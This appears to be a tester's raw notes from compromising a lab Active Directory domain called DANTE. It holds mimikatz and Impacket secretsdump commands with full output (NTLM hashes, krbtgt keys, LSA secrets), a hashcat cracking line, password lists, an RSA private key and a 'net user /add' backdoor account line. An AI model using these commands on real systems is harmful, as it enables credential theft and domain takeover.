# Creds

*gerald:SomeoneSaveMe98*

Administrator:d0629f5539666892bf9ba4b34daa434c

Administrator:c55ed3c3d34c4576bcd33c76420be934

ran Inveigh on 172.16.1.13

PS C:\Windows\Temp>
cat Inveigh-NTLMv2.txt
PS C:\Windows\Temp> cat Inveigh-NTLMv2.txt
xadmin::DANTE:88A93862F4689F46:A2E2EFA4DB759A233866B2D1FB9D1D88:0101000000000000572ADFCCC50CDD013DFFB313A02AA60A0000000002001400440041004E00540045002D00570053003000310001001400440041004E00540045002D00570053003000310004001400440041004E00540045002D00570053003000310003001400440041004E00540045002D00570053003000310007000800572ADFCCC50CDD01060004000200000008003000300000000000000000000000003000002F2F151556C56D26D69341FBD22AAF503A7814F38F9C626F446899AE40AAB4050A001000000000000000000000000000000000000900140063006900660073002F006400610074006E006500000000000000000000000000

sudo hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt.gz

julian:manchesterunited

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 106716 (00000000:0001a0dc)
Session           : Batch from 0
User Name         : xadmin
Domain            : DANTE
Logon Server      : DANTE-DC01
Logon Time        : 7/7/2026 1:06:08 AM
SID               : S-1-5-21-2273245918-2602599687-2649756301-7104
msv :	
[00010000] CredentialKeys
* NTLM     : 649f65073a6672a9898cb4eb61f9684a
* SHA1     : b57e3049b5960ed60f1baa679fb0cfd4f68b0b06
[00000003] Primary
* Username : xadmin
* Domain   : DANTE
* NTLM     : 649f65073a6672a9898cb4eb61f9684a
* SHA1     : b57e3049b5960ed60f1baa679fb0cfd4f68b0b06

```
 * Username : xadmin
 * Domain   : DANTE.local
 * Password : Peacemaker!
```

Authentication Id : 0 ; 209825 (00000000:000333a1)
Session           : Interactive from 1
User Name         : katwamba
Domain            : DANTE
Logon Server      : DANTE-DC01
Logon Time        : 7/7/2026 1:06:48 AM
SID               : S-1-5-21-2273245918-2602599687-2649756301-1002
msv :	
[00000003] Primary
* Username : katwamba
* Domain   : DANTE
* NTLM     : 14a71f9e65448d83e8c63d46355837c3
* SHA1     : 61d3cacf6ad5f4571747b302a9658f7e85c5d516
[00010000] CredentialKeys
* NTLM     : 14a71f9e65448d83e8c63d46355837c3
* SHA1     : 61d3cacf6ad5f4571747b302a9658f7e85c5d516

mimikatz # lsadump::sam
Domain : DANTE-DC01
SysKey : f0ec920edb5e772deff87b234eca175a
Local SID : S-1-5-21-1811357089-1343779452-1520208081

SAMKey : d4b8bc0f753f38a55299e5a294d74561

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 9bff06fe611486579fb74037890fda96

RID  : 000001f5 (501)
User : Guest

mimikatz # lsadump::lsa /patch
Domain : DANTE / S-1-5-21-2273245918-2602599687-2649756301

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 9bff06fe611486579fb74037890fda96

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 49e6f37ede481d09747f6a0c9abcbaa7

RID  : 000003e9 (1001)
User : SelfHealUser
LM   :
NTLM : 236a174dfe9cf1f702ae493d934fb70e

RID  : 000003ea (1002)
User : katwamba
LM   :
NTLM : 14a71f9e65448d83e8c63d46355837c3

RID  : 00000838 (2104)
User : mrb3n
LM   :
NTLM : cf3a5525ee9414229e66279623ed5c58

RID  : 00001bc0 (7104)
User : xadmin
LM   :
NTLM : 649f65073a6672a9898cb4eb61f9684a

RID  : 000003eb (1003)
User : DANTE-DC01$
LM   :
NTLM : 28a660374e0ed9ba446a82cd830539f3

RID  : 0000045d (1117)
User : MediaAdmin$
LM   :
NTLM : 07af19fced8ec698944ca08954d402d8

lsadump::dcsync /user:Administrator
[DC] 'DANTE.local' will be the domain
[DC] 'DANTE-DC01.DANTE.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

- * SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1/1/1601 1:00:00 AM
Password last change : 6/10/2020 12:36:17 PM
Object Security ID   : S-1-5-21-2273245918-2602599687-2649756301-500
Object Relative ID   : 500

Credentials:
Hash NTLM: 9bff06fe611486579fb74037890fda96

[secretsdump.py](http://secretsdump.py/) -sam sam -security security -system system local
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xf0ec920edb5e772deff87b234eca175a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DANTE\DANTE-DC01$:aes256-cts-hmac-sha1-96:90fbf60b8c59914512254062624b28a64e432d53a8f1a6c5a31bac165b934d82
DANTE\DANTE-DC01$:aes128-cts-hmac-sha1-96:337050c5329c7b789bfa88fe586791e0
DANTE\DANTE-DC01$:des-cbc-md5:515e10eacb453275
DANTE\DANTE-DC01$:plain_password_hex:68908ed85b64f6d41375450ecc73072a40b983b286070e1d945c0bbf7cf3fe85c9aba6c0eb0c97310d58d3b6739ac49e4333e89ffc0b861624d348cdad4adcf085695fdc8d9ed8ab7c1abe72110dbe2b0ddfed17f3811f252869dbd2239fabb2bed70458efea686b8902744618242bb6c4d69414417744f91be417e17fc16834b2fcad705772ee65805ac0ccf4a47d449fb565c480a201c29fca758cc1241dae66128d5f0d16da9f6f181d56271a3f9ff834d62c715d691f9131dc92a99d4c68645179786c0efcbe7b2a708d91c1a99fa0ea20a57c9c585b4345306c51d2dcd106fc61ede0a54569b1afa0f4cda2afd1
DANTE\DANTE-DC01$:aad3b435b51404eeaad3b435b51404ee:28a660374e0ed9ba446a82cd830539f3:::
[*] DefaultPassword
(Unknown User):DishonestSupermanDiablo5679
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb43a17dc9283a05fbbec6a22b216598ad49cea3e
dpapi_userkey:0x15065e7548fab3c53d83d5ba032dbad1f2f5f2dc
[*] NL$KM
0000   96 CA BE 6B E4 97 48 C6  78 D2 49 D0 F9 50 54 12   ...k..H.x.I..PT.
0010   D8 ED FA 60 81 CD A4 53  BA 63 BA 28 2F 83 36 59   ...`...S.c.(/.6Y  0020   58 6E 14 D4 7B DB 43 B7  70 9A 42 8E 35 1A D9 06   Xn..{.C.p.B.5...  0030   81 77 BB 15 41 6A B9 98  FC 6E 51 9E 8E 16 A2 F1   .w..Aj...nQ..... NL$KM:96cabe6be49748c678d249d0f9505412d8edfa6081cda453ba63ba282f833659586e14d47bdb43b7709a428e351ad9068177bb15416ab998fc6e519e8e16a2f1 [*] _SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_MediaAdmin$   0000   D5 B2 2E 55 00 62 0B 0A  07 79 83 52 D6 6A 6A 60   ...U.b...y.R.jj`
0010   94 C3 8E 08 98 BE 8D 0E  B5 15 21 72 DA 85 55 B9   ..........!r..U.
0020   C4 1B 4D 3B 55 7A 48 F6  CF EB B8 4E 9C 80 ED 8C   ..M;UzH....N....
0030   A8 A8 AC 12 72 AE 45 51  28 1B E1 3C C1 83 FA 21   ....r.EQ(..<...!
0040   5B C4 42 5E 30 24 34 3E  6F EC 8B C6 0A 03 84 FD   [.B^0$4>o.......
0050   C6 0F E7 CA BB 41 3D DE  E9 46 EC C3 EA A9 48 D7   .....A=..F....H.
0060   6B 88 A2 42 5E 8E 72 C8  82 A7 C0 4E 5A 62 77 03   k..B^.r....NZbw.
0070   F2 FE 9A 5D 19 CA 12 1A  70 A7 AA D1 A6 61 F5 AE   ...]....p....a..
0080   FB C9 73 C8 DB E9 1D A8  AD 80 3F 12 4C AA 17 3D   ..s.......?.L..=
0090   18 D1 5A 45 14 11 8D 8A  5F 54 31 E8 BA 2F FD 57   ..ZE...._T1../.W
00a0   31 5D 52 C2 EB E8 72 96  29 6E CC 1D FD 7B 2D A9   1]R...r.)n...{-.
00b0   0D 42 49 6D E5 35 82 78  F0 69 90 80 CF 98 12 04   .BIm.5.x.i......
00c0   BA 76 69 18 A1 B1 EE EC  7A 0E BF 90 47 11 E5 08   .vi.....z...G...
00d0   5B 0D D0 54 D4 21 32 E8  41 18 4D F7 BF 49 47 AF   [..T.!2.A.M..IG.
00e0   01 60 49 4A 70 83 29 A7  5D 14 3B 34 05 1B B2 F0   .`IJp.).].;4....
*SC*{262E99C9-6160-4871-ACEC-4E61736B6F21}_MediaAdmin$:d5b22e5500620b0a07798352d66a6a6094c38e0898be8d0eb5152172da8555b9c41b4d3b557a48f6cfebb84e9c80ed8ca8a8ac1272ae4551281be13cc183fa215bc4425e3024343e6fec8bc60a0384fdc60fe7cabb413ddee946ecc3eaa948d76b88a2425e8e72c882a7c04e5a627703f2fe9a5d19ca121a70a7aad1a661f5aefbc973c8dbe91da8ad803f124caa173d18d15a4514118d8a5f5431e8ba2ffd57315d52c2ebe87296296ecc1dfd7b2da90d42496de5358278f0699080cf981204ba766918a1b1eeec7a0ebf904711e5085b0dd054d42132e841184df7bf4947af0160494a708329a75d143b34051bb2f0

impacket-secretsdump DANTE.local/katwamba@172.16.1.20 -dc-ip 172.16.1.20 -hashes :14a71f9e65448d83e8c63d46355837c3
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf0ec920edb5e772deff87b234eca175a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DANTE\DANTE-DC01$:aes256-cts-hmac-sha1-96:90fbf60b8c59914512254062624b28a64e432d53a8f1a6c5a31bac165b934d82
DANTE\DANTE-DC01$:aes128-cts-hmac-sha1-96:337050c5329c7b789bfa88fe586791e0
DANTE\DANTE-DC01$:des-cbc-md5:515e10eacb453275
DANTE\DANTE-DC01$:plain_password_hex:68908ed85b64f6d41375450ecc73072a40b983b286070e1d945c0bbf7cf3fe85c9aba6c0eb0c97310d58d3b6739ac49e4333e89ffc0b861624d348cdad4adcf085695fdc8d9ed8ab7c1abe72110dbe2b0ddfed17f3811f252869dbd2239fabb2bed70458efea686b8902744618242bb6c4d69414417744f91be417e17fc16834b2fcad705772ee65805ac0ccf4a47d449fb565c480a201c29fca758cc1241dae66128d5f0d16da9f6f181d56271a3f9ff834d62c715d691f9131dc92a99d4c68645179786c0efcbe7b2a708d91c1a99fa0ea20a57c9c585b4345306c51d2dcd106fc61ede0a54569b1afa0f4cda2afd1
DANTE\DANTE-DC01$:aad3b435b51404eeaad3b435b51404ee:28a660374e0ed9ba446a82cd830539f3:::
[*] DefaultPassword
DANTE\katwamba:DishonestSupermanDiablo5679
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb43a17dc9283a05fbbec6a22b216598ad49cea3e
dpapi_userkey:0x15065e7548fab3c53d83d5ba032dbad1f2f5f2dc
[*] NL$KM
0000   96 CA BE 6B E4 97 48 C6  78 D2 49 D0 F9 50 54 12   ...k..H.x.I..PT.
0010   D8 ED FA 60 81 CD A4 53  BA 63 BA 28 2F 83 36 59   ...`...S.c.(/.6Y  0020   58 6E 14 D4 7B DB 43 B7  70 9A 42 8E 35 1A D9 06   Xn..{.C.p.B.5...  0030   81 77 BB 15 41 6A B9 98  FC 6E 51 9E 8E 16 A2 F1   .w..Aj...nQ..... NL$KM:96cabe6be49748c678d249d0f9505412d8edfa6081cda453ba63ba282f833659586e14d47bdb43b7709a428e351ad9068177bb15416ab998fc6e519e8e16a2f1 [*] _SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_MediaAdmin$   0000   D5 B2 2E 55 00 62 0B 0A  07 79 83 52 D6 6A 6A 60   ...U.b...y.R.jj`
0010   94 C3 8E 08 98 BE 8D 0E  B5 15 21 72 DA 85 55 B9   ..........!r..U.
0020   C4 1B 4D 3B 55 7A 48 F6  CF EB B8 4E 9C 80 ED 8C   ..M;UzH....N....
0030   A8 A8 AC 12 72 AE 45 51  28 1B E1 3C C1 83 FA 21   ....r.EQ(..<...!
0040   5B C4 42 5E 30 24 34 3E  6F EC 8B C6 0A 03 84 FD   [.B^0$4>o.......
0050   C6 0F E7 CA BB 41 3D DE  E9 46 EC C3 EA A9 48 D7   .....A=..F....H.
0060   6B 88 A2 42 5E 8E 72 C8  82 A7 C0 4E 5A 62 77 03   k..B^.r....NZbw.
0070   F2 FE 9A 5D 19 CA 12 1A  70 A7 AA D1 A6 61 F5 AE   ...]....p....a..
0080   FB C9 73 C8 DB E9 1D A8  AD 80 3F 12 4C AA 17 3D   ..s.......?.L..=
0090   18 D1 5A 45 14 11 8D 8A  5F 54 31 E8 BA 2F FD 57   ..ZE...._T1../.W
00a0   31 5D 52 C2 EB E8 72 96  29 6E CC 1D FD 7B 2D A9   1]R...r.)n...{-.
00b0   0D 42 49 6D E5 35 82 78  F0 69 90 80 CF 98 12 04   .BIm.5.x.i......
00c0   BA 76 69 18 A1 B1 EE EC  7A 0E BF 90 47 11 E5 08   .vi.....z...G...
00d0   5B 0D D0 54 D4 21 32 E8  41 18 4D F7 BF 49 47 AF   [..T.!2.A.M..IG.
00e0   01 60 49 4A 70 83 29 A7  5D 14 3B 34 05 1B B2 F0   .`IJp.).].;4....
*SC*{262E99C9-6160-4871-ACEC-4E61736B6F21}_MediaAdmin$:d5b22e5500620b0a07798352d66a6a6094c38e0898be8d0eb5152172da8555b9c41b4d3b557a48f6cfebb84e9c80ed8ca8a8ac1272ae4551281be13cc183fa215bc4425e3024343e6fec8bc60a0384fdc60fe7cabb413ddee946ecc3eaa948d76b88a2425e8e72c882a7c04e5a627703f2fe9a5d19ca121a70a7aad1a661f5aefbc973c8dbe91da8ad803f124caa173d18d15a4514118d8a5f5431e8ba2ffd57315d52c2ebe87296296ecc1dfd7b2da90d42496de5358278f0699080cf981204ba766918a1b1eeec7a0ebf904711e5085b0dd054d42132e841184df7bf4947af0160494a708329a75d143b34051bb2f0
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49e6f37ede481d09747f6a0c9abcbaa7:::
DANTE.local\SelfHealUser:1001:aad3b435b51404eeaad3b435b51404ee:236a174dfe9cf1f702ae493d934fb70e:::
DANTE.local\katwamba:1002:aad3b435b51404eeaad3b435b51404ee:14a71f9e65448d83e8c63d46355837c3:::
mrb3n:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
DANTE.local\xadmin:7104:aad3b435b51404eeaad3b435b51404ee:649f65073a6672a9898cb4eb61f9684a:::
DANTE-DC01$:1003:aad3b435b51404eeaad3b435b51404ee:28a660374e0ed9ba446a82cd830539f3:::
MediaAdmin$:1117:aad3b435b51404eeaad3b435b51404ee:07af19fced8ec698944ca08954d402d8:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:1e16c72322ec508e1c1312b472a615a43759fe6a97fe4644a427821c7806dd01
krbtgt:aes128-cts-hmac-sha1-96:42f40cdeb3c715570710371922f5d997
krbtgt:des-cbc-md5:02fba8ba0de3f157
DANTE.local\SelfHealUser:aes256-cts-hmac-sha1-96:284ab155434058eac6064e31ba928f90bbdb1afa8387b8632c13e5f53604e33b
DANTE.local\SelfHealUser:aes128-cts-hmac-sha1-96:c72c0b84eb7e2b7a386ab23d3265c680
DANTE.local\SelfHealUser:des-cbc-md5:5d8cbfe67ae3f20d
DANTE.local\katwamba:aes256-cts-hmac-sha1-96:7dba6bec2703807ffe586e927a3e1c7ea7a610bc025d29c5db2656b1a6be437b
DANTE.local\katwamba:aes128-cts-hmac-sha1-96:38f3e73169b94345c72b257294949518
DANTE.local\katwamba:des-cbc-md5:a2765161d04c8301
mrb3n:aes256-cts-hmac-sha1-96:c7dc1b6a6c05c8b01566cf039484a74c094580b740f36a95d117705b66698649
mrb3n:aes128-cts-hmac-sha1-96:56c18f870282cb50fbe28cc6fc9321aa
mrb3n:des-cbc-md5:b3da68b0d67ac8df
DANTE.local\xadmin:aes256-cts-hmac-sha1-96:964ceb40ec542d105c3a60ec9a8fff1eddae78a86a659eabe11a76f5c525a651
DANTE.local\xadmin:aes128-cts-hmac-sha1-96:b14d3dc24903c71f63a98acd6301dd7d
DANTE.local\xadmin:des-cbc-md5:f8ae31d0a76891a1
DANTE-DC01$:aes256-cts-hmac-sha1-96:90fbf60b8c59914512254062624b28a64e432d53a8f1a6c5a31bac165b934d82
DANTE-DC01$:aes128-cts-hmac-sha1-96:337050c5329c7b789bfa88fe586791e0
DANTE-DC01$:des-cbc-md5:ab5e4c9d3e0d23e6
MediaAdmin$:aes256-cts-hmac-sha1-96:32d2541cba26e9ff8818736cc759164f3784a7e6c28031ce52088cf4367808d1
MediaAdmin$:aes128-cts-hmac-sha1-96:e0c2952a5e1cec9b7397f0a68a57c126
MediaAdmin$:des-cbc-md5:bc9d572a521c0402

cat employee_backup.xlsx

asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley

mrb3n

14a71f9e65448d83e8c63d46355837c3

649f65073a6672a9898cb4eb61f9684a

cf3a5525ee9414229e66279623ed5c58

DishonestSupermanDiablo5679
Peacemaker!
manchesterunited
SomeoneSaveMe98

Welcome1

Password12345

cat pass.txt
Princess1
Summer2019
P45678!
Password1
Teacher65
4567Holiday1
acb123
WorldOfWarcraft67
RopeBlackfieldForwardslash
JuneJuly1TY
FinalFantasy7
65RedBalloons
WestminsterOrange5
MarksAndSparks91
Bullingdon1
Sheffield23
PowerfixSaturdayClub777
Tanenbaum0001
SuperStrongCantForget123456789
S3kur1ty2020!

cat ssh_host_rsa_key

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA85f70qW/awCjhHceluNflKb0vRkdLnDRSfrhcI5c9IijbsUN
vFYs8sGnGFBBf8cGo952paLvf5VNTKTl2xEYik/vmlXgigAh5V//mLJpzA/UVAiI
2aeDKHhaeAFjdn3tcMhboVZxjgZkUMsXj5Mzp8ryCdgJOw2Ywlzi5M0ynIsvXhiW
SyarPLap1LJZ+KdcveGiLDHI8Z0dctHkUBi+87WJS+6V3TfZEmcF+hy0JNVkLT4O
VXaZJdkKnPrgT9vVzp+dc8qSVXlzhZA7p0VLf4HzG80/Nf/3DgESiMeQ9lfZM9DR
T0OUdWjjG2dHRDjASfC8NCXYcpUMvbIR1ELygQIDAQABAoIBAAqhW0/6A7x7rqcd
O6yCB63JC20lJ2zbZ4a++A+dZtkVDWzMFKlfaV6+rLgW6ITW/qcwEiVwUttSfKkX
mSBSQqvmiSJHFSFwmAoWgmT7hDpvhmiUZsR41vRxLCGIjfqhzDbbx4Pm7dWw2bfc
5Q5S8jIkXSOo1d5J3Zy9yPkLK2ZBZugEweTw4j6+9gS7ZeK4tUuda5RSjoDoOEJn
fd9hWxpmnavSI2fUDFpJv8EySLTxCcQ/aasxbTIg46HCN+RgwUKXXKZbJCX8QFnj
s2dBtApydR5wCm5Yi5Welshsbs4xy2vJf+AU3GX8Z7H6UbaQBZTPwVszJHTn4Rjh
DPPnVQECgYEA+x4XIuhAbOUtGtkJoAHtfw/9w6AnOssFO0FT7DrMcKywpWqLJzAc
wU7h/kHmo6XEgddA9mZW4kgJZHYGlCEB5wm02yU0Ry7mpDsKbQAKbEr6JQdCTnkd
NzVKl4iZOtSIKKqT5IouFfHiXcBs8DchL0c0OBezxCp9WG/nzTiCxSkCgYEA+FRx
tGXfg3oo0Zs4ESLkHQYVWepfhCxvra8v5CJBs0Rb403kZYySqaK/7JpPrFBdQ0AK
4rXrDB7Jw0ZL3r9xPOGBNF5cEQwK5xaaGZPL8RgFhD5UcLQGvSV/TlV3FoYCYw60
ioZcV/LN+pRxPNXMXWDIIyze9GlcROKLFrGQ1ZkCgYAbFByUlAzWcUQS4BKMoYiV
qgjIPo3cZiYTRLEjCRggkk6eF8YXnLWNFs+B1mNjhC2Tfr2vlEuMLQ5uOdftwz1s
R3ysIO/pOSJ/1SoDpPx6vv8IXScGRUMkP+fiPUWgtWhVUkeOXmQn06SATY6xvJAk
g/4ailvFLHvFvJN3ar+XOQKBgCAmprYJfn/CQCirJP4q+0e6sub6TjWJn0foZ5Xs
zX7NOexa+FghdBecZ6bVb71KhlifoQkrLmxaTBsJLed/98Q/GgBSuy7F1V+H8Jmh
JgVn68bsXvhchobUpP/aVtnGreZvT/ajYK9OU1a/A04yDAyG7EKJm7AfN///KKze
fnb5AoGAcMh8kx3B6ustoNrJAXT5VgBWyCQIeE8tJ6lx5onXq9GAU415kYb4fjBL
j0WaWdyK5Nb3dy6irIZg776g0e+HzW3Z8SQRB7SJFtbAY9+2EhYMnvyxtBYsNAjj
RPpem5186Yx5GJK0XxnKdU/99JPmuPuP6G0W5r5nsQ8f/qfs2R0=
-----END RSA PRIVATE KEY-----

cat Jenkins.bat
net user Admin_129834765 SamsungOctober102030 /add